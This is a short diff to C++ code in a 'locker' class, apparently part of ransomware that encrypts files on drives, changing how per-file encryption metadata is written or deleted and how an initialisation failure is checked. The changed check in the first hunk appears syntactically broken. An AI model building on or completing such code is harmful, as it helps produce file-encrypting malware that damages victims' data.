@@ -502,7 +502,7 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 		return false;
 	}
 
-	if (!(FileInfo->hblock = filesystem::init_mdata_hblock(FileInfo)))
+	if (!(FileInfo->hblock = filesystem::init_mdata_hblock(FileInfo))->status)
 	{
 		LOG_ERROR("[SetOptionFileInfo] [INIT_MEATA_HBLOCK] Failed; %s", data->Filename);
 		return false;
@@ -515,10 +515,11 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 
 void locker::free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO data, bool success)
 {
-	FileInfo->hblock->crypt == 1 ? 
-		filesystem::write_metadata(FileInfo)
-		:
-		filesystem::delete_metadata(FileInfo->recent_filehandle, &FileInfo->filesize);
+	if(success)
+		FileInfo->hblock->crypt ? 
+			filesystem::write_metadata(FileInfo)
+			:
+			filesystem::delete_metadata(FileInfo->recent_filehandle, &FileInfo->filesize);
 
 	if (FileInfo->filehandle != INVALID_HANDLE_VALUE)
 		api::CloseDesc(FileInfo->filehandle);
